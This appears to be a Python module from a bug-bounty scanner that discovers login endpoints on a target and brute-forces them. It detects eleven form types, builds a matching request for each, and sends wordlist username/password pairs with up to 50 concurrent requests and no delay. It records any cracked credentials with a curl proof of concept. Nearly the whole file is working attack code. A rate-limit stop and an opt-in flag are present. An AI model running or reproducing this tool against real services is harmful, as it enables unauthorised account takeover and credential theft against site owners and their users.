import asyncio
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities with stealth - NO DELAY VERSION"""

    # ─────────────────────────────────────────────────────────
    # Form-type registry
    # Each entry describes how to detect and attack a form type.
    # ─────────────────────────────────────────────────────────
    FORM_TYPE_REGISTRY = {
        # ── Standard HTML <form> ──────────────────────────────
        'html_form': {
            'description': 'Classic HTML form with POST',
            'content_type': 'application/x-www-form-urlencoded',
            'method': 'POST',
        },
        # ── REST JSON API ─────────────────────────────────────
        'json_api': {
            'description': 'REST endpoint that accepts JSON body',
            'content_type': 'application/json',
            'method': 'POST',
        },
        # ── GraphQL ───────────────────────────────────────────
        'graphql': {
            'description': 'GraphQL mutation for login',
            'content_type': 'application/json',
            'method': 'POST',
        },
        # ── OAuth2 / Token endpoint ───────────────────────────
        'oauth2': {
            'description': 'OAuth2 password-grant or token endpoint',
            'content_type': 'application/x-www-form-urlencoded',
            'method': 'POST',
        },
        # ── Basic-Auth ────────────────────────────────────────
        'basic_auth': {
            'description': 'HTTP Basic Authentication (Authorization header)',
            'content_type': None,
            'method': 'GET',
        },
        # ── XML / SOAP ────────────────────────────────────────
        'xml_soap': {
            'description': 'SOAP/XML web-service login',
            'content_type': 'text/xml',
            'method': 'POST',
        },
        # ── Multipart form ───────────────────────────────────
        'multipart_form': {
            'description': 'HTML multipart/form-data (file-upload forms)',
            'content_type': 'multipart/form-data',
            'method': 'POST',
        },
        # ── JWT refresh / login ───────────────────────────────
        'jwt_login': {
            'description': 'Endpoint that issues a JWT on login',
            'content_type': 'application/json',
            'method': 'POST',
        },
        # ── AJAX / XHR form ───────────────────────────────────
        'ajax_form': {
            'description': 'AJAX-driven login (XMLHttpRequest / fetch)',
            'content_type': 'application/json',
            'method': 'POST',
        },
        # ── WordPress wp-login.php ────────────────────────────
        'wordpress': {
            'description': 'WordPress wp-login.php form',
            'content_type': 'application/x-www-form-urlencoded',
            'method': 'POST',
        },
        # ── Digest Auth ───────────────────────────────────────
        'digest_auth': {
            'description': 'HTTP Digest Authentication',
            'content_type': None,
            'method': 'GET',
        },
    }

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts   = config.get('max_attempts', 1000)
        self.delay          = 0  # FORCE NO DELAY
        self.wordlist_path  = config.get('wordlist_path', 'wordlists')
        # ── Concurrency: how many requests fly simultaneously ──
        # 50 is safe for CTF targets; raise to 100-200 if the
        # target is local / doesn't throttle connections.
        self.concurrency    = config.get('concurrency', 50)

    # ─────────────────────────────────────────────────────────
    # Entry point
    # ─────────────────────────────────────────────────────────
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """Run brute force tests"""
        self.logger.info(f"Testing brute force protections on {target}")

        if not kwargs.get('enable_brute_force', False):
            self.logger.info("Brute force testing disabled (use --enable-brute-force to enable)")
            return self.findings

        login_endpoints = await self._discover_login_forms(target)

        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
        target_exists = any(ep['url'] == target_url for ep in login_endpoints)

        if not target_exists:
            self.logger.info(f"Adding direct target test: {target_url}")
            login_endpoints.insert(0, {
                'url': target_url,
                'type': 'direct',
                'form_type': 'html_form',
                'fields': {
                    'username_fields': ['email', 'username', 'user', 'login', 'name'],
                    'password_field': 'password',
                    'username_field': 'email',
                    'email_field': 'email'
                },
                'discovered_at': 'direct_target'
            })

        if not login_endpoints:
            self.logger.warning("No login endpoints discovered")
            return self.findings

        self.logger.info(f"Brute forcing {len(login_endpoints)} endpoint(s) directly — NO DELAY")

        for endpoint in login_endpoints:
            await self._test_brute_force(endpoint)

        return self.findings

    # ─────────────────────────────────────────────────────────
    # Discovery
    # ─────────────────────────────────────────────────────────
    async def _discover_login_forms(self, target: str) -> List[Dict]:
        """Discover login endpoints using multiple strategies"""
        import re
        endpoints = []
        seen_urls: Set[str] = set()

        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"

        from urllib.parse import urlparse, urljoin
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        candidate_urls = [target]

        common_paths = [
            # Standard auth paths
            '/login', '/signin', '/auth', '/authenticate',
            '/admin', '/admin/login', '/user/login', '/account/login',
            # API paths
            '/api/login', '/api/auth', '/api/token', '/oauth/token',
            '/api/v1/login', '/api/v2/login', '/api/v1/auth', '/api/v2/auth',
            '/api/v1/token', '/api/v2/token',
            # GraphQL
            '/graphql', '/api/graphql',
            # REST variants
            '/rest/login', '/json/login', '/ajax/login',
            # CMS paths
            '/wp-login.php', '/administrator/index.php',
            '/admin.html', '/login.html', '/signin.html',
            # App-specific
            '/auth/login', '/user/signin', '/member/login',
            '/dashboard/login', '/manage/login', '/control/login',
            # JWT / OAuth
            '/auth/token', '/oauth/authorize', '/connect/token',
            '/identity/connect/token',
            # SOAP / XML services
            '/service', '/services', '/ws', '/soap',
        ]

        for path in common_paths:
            candidate_urls.append(base + path)

        if parsed.query:
            candidate_urls.append(target)

        for url in candidate_urls:
            if url in seen_urls:
                continue
            seen_urls.add(url)

            try:
                self.logger.debug(f"Checking: {url}")
                response = await self._make_request(url)
                if not response:
                    continue
                if response.status not in [200, 301, 302, 401, 403, 405, 500]:
                    continue

                text = await response.text()
                if not text:
                    continue

                # Detect form type first
                form_type = self._detect_form_type(url, text, response.headers)

                indicators = [
                    'password', 'login', 'username', 'email', 'sign in', 'log in',
                    'signin', 'passwd', 'credentials', 'authentication',
                    'auth', 'token', 'session', 'oauth', 'sso'
                ]
                has_login_indicators = any(ind in text.lower() for ind in indicators)

                fields = self._extract_form_fields(text)

                is_api = 'application/json' in response.headers.get('Content-Type', '') or \
                         text.strip().startswith(('{', '['))

                js_frameworks = ['react', 'vue', 'angular', 'ember', 'next.js', 'nuxt']
                has_js_framework = any(fw in text.lower() for fw in js_frameworks)

                # Accept basic-auth / digest challenges even on 401
                is_http_auth = response.status == 401 and 'WWW-Authenticate' in response.headers

                if has_login_indicators or fields['inputs'] or is_api or has_js_framework or is_http_auth or form_type != 'html_form':

                    post_url = url
                    if fields.get('action'):
                        action = fields['action']
                        if action.startswith('http'):
                            post_url = action
                        elif action.startswith('/'):
                            post_url = base + action
                        else:
                            post_url = urljoin(url, action)

                    endpoint_info = {
                        'url': post_url,
                        'type': 'api' if is_api else ('js_framework' if has_js_framework else 'form'),
                        'form_type': form_type,
                        'fields': fields,
                        'discovered_at': url,
                        'indicators_found': has_login_indicators,
                        'is_api': is_api,
                        'is_http_auth': is_http_auth,
                        'www_authenticate': response.headers.get('WWW-Authenticate', ''),
                    }

                    endpoints.append(endpoint_info)
                    self.logger.info(
                        f"Found login endpoint: {post_url} "
                        f"(form_type={form_type}, type={endpoint_info['type']}, from={url})"
                    )

            except Exception as e:
                self.logger.debug(f"Login discovery error on {url}: {e}")

        # Deduplicate
        seen: Set[str] = set()
        unique = []
        for ep in endpoints:
            if ep['url'] not in seen:
                seen.add(ep['url'])
                unique.append(ep)

        return unique

    # ─────────────────────────────────────────────────────────
    # Form-type detection
    # ─────────────────────────────────────────────────────────
    def _detect_form_type(self, url: str, html: str, headers: Dict) -> str:
        """
        Analyse the URL, response headers, and body to classify the login
        form/endpoint into one of the known FORM_TYPE_REGISTRY keys.
        Returns the best-matching form_type string.
        """
        import re
        url_lower  = url.lower()
        html_lower = html.lower() if html else ''
        ct         = headers.get('Content-Type', '').lower() if headers else ''
        www_auth   = headers.get('WWW-Authenticate', '').lower() if headers else ''

        # ── Digest Auth ───────────────────────────────────────
        if 'digest' in www_auth:
            return 'digest_auth'

        # ── Basic Auth ────────────────────────────────────────
        if 'basic' in www_auth:
            return 'basic_auth'

        # ── SOAP / XML ────────────────────────────────────────
        soap_url_hints = ['/soap', '/ws/', '/wsdl', '/service', '/services']
        soap_body_hints = ['<soap:', 'wsdl', 'xmlns:soap', 'soapenv:', 'text/xml', 'application/soap']
        if any(h in url_lower for h in soap_url_hints) or \
           any(h in html_lower for h in soap_body_hints) or \
           'xml' in ct:
            return 'xml_soap'

        # ── WordPress ─────────────────────────────────────────
        if 'wp-login' in url_lower or \
           ('wordpress' in html_lower and 'log in' in html_lower):
            return 'wordpress'

        # ── GraphQL ───────────────────────────────────────────
        graphql_url_hints = ['/graphql', '/gql', '/graph']
        graphql_body_hints = ['__schema', 'mutation', 'query{', 'query {', 'graphql']
        if any(h in url_lower for h in graphql_url_hints) or \
           any(h in html_lower for h in graphql_body_hints):
            return 'graphql'

        # ── OAuth2 / Token ────────────────────────────────────
        oauth_url_hints = ['/oauth', '/token', '/connect/token', '/identity/connect']
        oauth_body_hints = ['grant_type', 'client_id', 'client_secret', 'access_token', 'oauth']
        if any(h in url_lower for h in oauth_url_hints) or \
           any(h in html_lower for h in oauth_body_hints):
            return 'oauth2'

        # ── JWT login ─────────────────────────────────────────
        jwt_url_hints = ['/jwt', '/api/token', '/api/auth', '/api/login']
        jwt_body_hints = ['access_token', 'refresh_token', 'jwt', 'bearer']
        if any(h in url_lower for h in jwt_url_hints) or \
           any(h in html_lower for h in jwt_body_hints):
            return 'jwt_login'

        # ── Multipart form ────────────────────────────────────
        if 'multipart' in html_lower or \
           re.search(r'enctype=["\']multipart', html_lower):
            return 'multipart_form'

        # ── AJAX / XHR form ───────────────────────────────────
        ajax_hints = ['xmlhttprequest', 'fetch(', 'axios', '$.ajax', '$.post',
                      'x-requested-with', 'json.stringify']
        if any(h in html_lower for h in ajax_hints):
            return 'ajax_form'

        # ── JSON API ──────────────────────────────────────────
        if 'application/json' in ct or \
           html.strip().startswith(('{', '[')) or \
           any(h in url_lower for h in ['/api/', '/rest/']):
            return 'json_api'

        # ── Default: classic HTML form ─────────────────────────
        return 'html_form'

    # ─────────────────────────────────────────────────────────
    # Payload builders (one per form type)
    # ─────────────────────────────────────────────────────────
    def _build_payload(
        self,
        form_type: str,
        username: str,
        password: str,
        username_fields: List[str],
        password_field: str,
    ) -> Dict:
        """
        Return a dict with keys:
          data    – body payload (dict or str)
          headers – extra request headers
          method  – HTTP verb
          use_json – True → send as JSON, False → form-encoded
          use_basic_auth – True → use HTTP Basic Auth tuple
          basic_auth_tuple – (user, pass) when use_basic_auth is True
        """
        result = {
            'data': {},
            'headers': {},
            'method': 'POST',
            'use_json': False,
            'use_basic_auth': False,
            'basic_auth_tuple': None,
        }

        if form_type == 'html_form':
            payload = {password_field: password}
            for f in username_fields:
                payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        elif form_type == 'json_api':
            payload = {password_field: password}
            for f in username_fields:
                payload[f] = username
            result['data'] = payload
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        elif form_type == 'graphql':
            # Build a generic GraphQL login mutation
            ufield = username_fields[0] if username_fields else 'email'
            mutation = (
                f'mutation {{ login({ufield}: "{username}", '
                f'{password_field}: "{password}") '
                f'{{ token user {{ id email }} }} }}'
            )
            result['data'] = {'query': mutation}
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'

        elif form_type == 'oauth2':
            result['data'] = {
                'grant_type': 'password',
                'username': username,
                'password': password,
                'scope': 'openid profile email',
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        elif form_type == 'basic_auth':
            result['use_basic_auth'] = True
            result['basic_auth_tuple'] = (username, password)
            result['method'] = 'GET'

        elif form_type == 'digest_auth':
            result['use_basic_auth'] = True
            result['basic_auth_tuple'] = (username, password)
            result['method'] = 'GET'

        elif form_type == 'xml_soap':
            xml_body = (
                '<?xml version="1.0" encoding="utf-8"?>'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body>'
                '<Login xmlns="http://tempuri.org/">'
                f'<username>{username}</username>'
                f'<password>{password}</password>'
                '</Login>'
                '</soap:Body>'
                '</soap:Envelope>'
            )
            result['data'] = xml_body
            result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
            result['headers']['SOAPAction'] = '"Login"'

        elif form_type == 'multipart_form':
            payload = {password_field: password}
            for f in username_fields:
                payload[f] = username
            result['data'] = payload
            # aiohttp handles multipart when data is a dict + explicit header omitted
            result['headers']['Content-Type'] = 'multipart/form-data'

        elif form_type in ('jwt_login', 'ajax_form'):
            payload = {password_field: password}
            for f in username_fields:
                payload[f] = username
            result['data'] = payload
            result['use_json'] = True
            result['headers']['Content-Type'] = 'application/json'
            if form_type == 'ajax_form':
                result['headers']['X-Requested-With'] = 'XMLHttpRequest'

        elif form_type == 'wordpress':
            result['data'] = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': '/wp-admin/',
                'testcookie': '1',
            }
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
            result['headers']['Cookie'] = 'wordpress_test_cookie=WP+Cookie+check'

        else:
            # Fallback: plain form POST
            payload = {password_field: password}
            for f in username_fields:
                payload[f] = username
            result['data'] = payload
            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'

        return result

    # ─────────────────────────────────────────────────────────
    # Field extraction (unchanged from original)
    # ─────────────────────────────────────────────────────────
    def _extract_form_fields(self, html: str) -> Dict:
        """Extract form fields from HTML/JS with comprehensive detection"""
        import re
        fields = {
            'inputs': [],
            'username_fields': [],
            'password_field': None,
            'action': '',
            'method': 'POST'
        }

        if not html:
            return fields

        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE)
        js_inputs = re.findall(r'name["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)

        common_patterns = [
            r'["\'](email|username|user|login|name)["\']',
            r'["\'](password|passwd|pwd|pass)["\']',
            r'["\'](token|auth|session)["\']'
        ]
        for pattern in common_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            inputs.extend(matches)

        fields['inputs'] = list(set(inputs + js_inputs))

        action_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if action_match:
            fields['action'] = action_match.group(1)

        method_match = re.search(r'<form[^>]+method=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if method_match:
            fields['method'] = method_match.group(1).upper()

        username_patterns = [
            'email', 'mail', 'e-mail', 'username', 'user', 'uname',
            'login', 'name', 'account', 'userid', 'user_id', 'auth_user',
            'identity', 'identifier', 'phone', 'mobile', 'cell'
        ]
        password_patterns = [
            'password', 'passwd', 'pwd', 'pass', 'user_password',
            'auth_pass', 'secret', 'key', 'credential'
        ]

        for inp in fields['inputs']:
            inp_lower = inp.lower()
            for pattern in username_patterns:
                if pattern in inp_lower and inp not in fields['username_fields']:
                    fields['username_fields'].append(inp)
                    break

        for inp in fields['inputs']:
            inp_lower = inp.lower()
            for pattern in password_patterns:
                if pattern in inp_lower:
                    fields['password_field'] = inp
                    break
            if fields['password_field']:
                break

        if not fields['username_fields']:
            html_lower = html.lower()
            if 'email' in html_lower or 'e-mail' in html_lower:
                fields['username_fields'] = ['email', 'username', 'user']
            elif 'username' in html_lower:
                fields['username_fields'] = ['username', 'email', 'user']
            else:
                fields['username_fields'] = ['email', 'username', 'user', 'login', 'name']

        if not fields['password_field']:
            fields['password_field'] = 'password'

        fields['username_field'] = fields['username_fields'][0]
        fields['email_field'] = fields['username_fields'][0]

        self.logger.debug(f"Detected fields: {fields['username_fields']} / {fields['password_field']}")
        return fields

    # ─────────────────────────────────────────────────────────
    # Wordlist helpers (unchanged from original)
    # ─────────────────────────────────────────────────────────
    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        """Load usernames and passwords from wordlists"""
        usernames = []
        passwords = []

        user_file = Path(self.wordlist_path) / 'usernames.txt'
        if user_file.exists():
            with open(user_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(usernames)} usernames")
        else:
            self.logger.warning(f"Usernames file not found: {user_file}")
            usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']

        pass_file = Path(self.wordlist_path) / 'passwords.txt'
        if pass_file.exists():
            with open(pass_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
        else:
            self.logger.warning(f"Passwords file not found: {pass_file}")
            passwords = ['admin', 'password', '123456', 'login', 'admin123']

        return usernames, passwords

    def _generate_username_variations(self, base_usernames: List[str]) -> Set[str]:
        """Generate all possible username variations"""
        variations: Set[str] = set()
        for username in base_usernames:
            variations.add(username)
            if '@' in username:
                local_part = username.split('@')[0]
                variations.add(local_part)
                variations.add(local_part + '@email.com')
                variations.add(local_part + '@gmail.com')
            else:
                variations.add(username + '@email.com')
                variations.add(username + '@gmail.com')
                variations.add(username + '@admin.com')
        return variations

    # ─────────────────────────────────────────────────────────
    # Core brute-force loop  (enhanced with form-type dispatch)
    # ─────────────────────────────────────────────────────────
    async def _test_brute_force(self, endpoint: Dict):
        """
        Concurrent brute force — fires self.concurrency requests simultaneously.

        Architecture
        ────────────
        • A semaphore caps parallel in-flight requests.
        • All (username, password) pairs are turned into asyncio Tasks and
          gathered at once — no serial outer loop waiting for each response.
        • A shared Event (_found) lets every task abort the moment one
          succeeds or a hard rate-limit is hit.
        • Attempt counter is updated atomically via a list (avoids nonlocal
          rebinding issues with asyncio).
        """
        import itertools

        url             = endpoint['url']
        fields          = endpoint.get('fields', {})
        form_type       = endpoint.get('form_type', 'html_form')
        username_fields = fields.get('username_fields', ['email', 'username', 'user', 'login'])
        password_field  = fields.get('password_field', 'password')

        self.logger.info(
            f"Starting CONCURRENT brute force on {url} "
            f"[form_type={form_type}] [concurrency={self.concurrency}] "
            f"[fields: {username_fields} / {password_field}]"
        )

        base_usernames, passwords = self._load_wordlists()
        all_usernames  = list(self._generate_username_variations(base_usernames))
        total_attempts = len(all_usernames) * len(passwords)

        self.logger.info(
            f"{len(all_usernames)} usernames × {len(passwords)} passwords "
            f"= {total_attempts} total attempts  |  "
            f"{self.concurrency} concurrent workers"
        )

        # ── Shared state ──────────────────────────────────────
        semaphore     = asyncio.Semaphore(self.concurrency)
        found_event   = asyncio.Event()          # set when creds found or hard-stop
        rate_limited  = [False]                  # mutable flag shared across tasks
        counter       = [0]                      # atomic-ish attempt counter

        # ── Single-attempt coroutine ──────────────────────────
        async def attempt(username: str, password: str):
            if found_event.is_set():
                return                           # abort early if already done

            async with semaphore:
                if found_event.is_set():
                    return                       # double-check after acquiring sem

                counter[0] += 1
                attempt_num = counter[0]

                if attempt_num % 50 == 0:
                    self.logger.info(f"Progress: {attempt_num}/{total_attempts} attempts...")

                p = self._build_payload(
                    form_type, username, password,
                    username_fields, password_field
                )

                try:
                    response = None

                    if p['use_basic_auth']:
                        response = await self._make_request(
                            url, method=p['method'],
                            auth=p['basic_auth_tuple'],
                            allow_redirects=False, headers=p['headers'],
                        )
                    elif isinstance(p['data'], str):          # SOAP / XML
                        response = await self._make_request(
                            url, method=p['method'],
                            data=p['data'],
                            allow_redirects=False, headers=p['headers'],
                        )
                    elif p['use_json']:
                        response = await self._make_request(
                            url, method=p['method'],
                            json=p['data'],
                            allow_redirects=False, headers=p['headers'],
                        )
                    else:
                        response = await self._make_request(
                            url, method=p['method'],
                            data=p['data'],
                            allow_redirects=False, headers=p['headers'],
                        )

                    if not response:
                        return

                    # ── Hard rate-limit: stop everything ──────
                    if response.status in [429, 503]:
                        rate_limited[0] = True
                        self.logger.warning(
                            f"Rate limited (HTTP {response.status}) "
                            f"after {attempt_num} attempts — stopping all workers"
                        )
                        found_event.set()
                        return

                    # ── Account lockout ───────────────────────
                    text = await response.text()
                    lockout_indicators = [
                        'locked', 'blocked', 'too many attempts',
                        'try again later', 'suspended', 'account disabled'
                    ]
                    if any(ind in text.lower() for ind in lockout_indicators):
                        self.logger.warning(f"Lockout detected at attempt {attempt_num}")
                        found_event.set()
                        return

                    # ── Success check ─────────────────────────
                    if await self._check_login_success(response, url):
                        self._report_success(
                            username, password, url, attempt_num,
                            username_fields, password_field
                        )
                        found_event.set()

                except Exception as e:
                    self.logger.error(f"Attempt {attempt_num} error: {e}")

        # ── Launch all tasks concurrently ─────────────────────
        tasks = [
            asyncio.create_task(attempt(u, p))
            for u, p in itertools.product(all_usernames, passwords)
        ]

        # gather() runs everything; exceptions inside tasks are caught above
        await asyncio.gather(*tasks, return_exceptions=True)

        # ── Summary ───────────────────────────────────────────
        if rate_limited[0]:
            self._add_rate_limit_finding(url, counter[0])
        elif not found_event.is_set():
            self.logger.info(
                f"No credentials found after {counter[0]} attempts on {url}"
            )

    # ─────────────────────────────────────────────────────────
    # Rate-limit test (unchanged from original)
    # ─────────────────────────────────────────────────────────
    async def _test_rate_limiting(self, endpoint: Dict):
        """Test rate limiting - NO DELAY"""
        url = endpoint['url']
        responses = []

        self.logger.info(f"Testing rate limiting on {url} (no delay)")

        for i in range(min(5, self.max_attempts)):
            try:
                response = await self._make_request(
                    url,
                    method='POST',
                    data={'username': f'test{i}@test.com', 'password': 'wrong123'}
                )
                if response:
                    responses.append(response.status)
            except:
                responses.append('error')
            # NO SLEEP HERE

        if 429 in responses or 503 in responses or 403 in responses:
            self.logger.info(f"Rate limiting detected on {url}")
        else:
            finding = Finding(
                module='brute_force',
                title='Missing Rate Limiting on Authentication',
                severity='High',
                description=f'No rate limiting on {url} after {len(responses)} rapid requests',
                evidence={'endpoint': url, 'requests': len(responses), 'responses': responses},
                poc=f"Send rapid login requests to {url}",
                remediation='Implement rate limiting (max 5 attempts per IP per 15 minutes)',
                cvss_score=7.5,
                bounty_score=1000,
                target=url
            )
            self.add_finding(finding)

    # ─────────────────────────────────────────────────────────
    # Success detection (unchanged from original)
    # ─────────────────────────────────────────────────────────
    async def _check_login_success(self, response, url: str) -> bool:
        """Universal login success detection"""
        try:
            status = response.status

            if status in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location:
                    success_paths = ['/dashboard', '/admin', '/home', '/profile', '/welcome', '/panel', '/main']
                    failure_paths = ['/login', '/signin', '/error', '/fail', '/denied']
                    if any(p in location.lower() for p in success_paths):
                        self.logger.info(f"Success: redirect to {location}")
                        return True
                    if any(p in location.lower() for p in failure_paths):
                        return False

            if status == 200:
                text = await response.text()
                text_lower = text.lower()
                failures = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again']
                for f in failures:
                    if f in text_lower:
                        return False
                successes = ['welcome', 'dashboard', 'logout', 'profile', 'admin panel', 'successful', 'session', 'token']
                success_count = sum(1 for s in successes if s in text_lower)
                cookies = response.headers.get('Set-Cookie', '').lower()
                if any(c in cookies for c in ['session', 'token', 'auth', 'jwt']):
                    return True
                if success_count >= 2:
                    return True

            if status in [200, 201] and 'application/json' in response.headers.get('Content-Type', ''):
                text = await response.text()
                if any(k in text.lower() for k in ['token', 'access_token', 'auth_token', 'session']):
                    return True

            # Basic/Digest: 200 after 401 challenge = success
            if status == 200 and response.headers.get('WWW-Authenticate'):
                return True

            return False

        except Exception as e:
            self.logger.error(f"Error checking success: {e}")
            return False

    # ─────────────────────────────────────────────────────────
    # Reporting helpers (unchanged from original)
    # ─────────────────────────────────────────────────────────
    def _report_success(
        self,
        username: str,
        password: str,
        url: str,
        attempts: int,
        username_fields: List[str],
        password_field: str,
    ):
        """Report successful login finding"""
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")

        finding = Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=(
                f'Successfully brute-forced login at {url}\n'
                f'Username: {username}\nPassword: {password}\nAttempts: {attempts}'
            ),
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d '{username_fields[0]}={username}&{password_field}={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8,
            bounty_score=5000,
            target=url
        )
        self.add_finding(finding)

    def _add_rate_limit_finding(self, url: str, attempts: int):
        """Add rate limiting finding"""
        finding = Finding(
            module='brute_force',
            title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0,
            bounty_score=0,
            target=url
        )
        self.add_finding(finding)
